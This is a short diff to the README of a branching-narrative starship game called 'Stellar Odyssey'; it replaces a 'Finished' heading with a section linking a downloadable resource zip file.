@@ -19,4 +19,8 @@ As a starship captain of the Stellar Alliance, you pilot a spacecraft deep into 
 * Branching Narrative: Your decisions shape the story and outcome.
 
 
-### Finished
+
+
+
+### Resource Zip File
+[[Stellar Odyssey]-AI-Game-Creator.zip](https://github.com/user-attachments/files/19448486/Stellar.Odyssey.-AI-Game-Creator.zip)
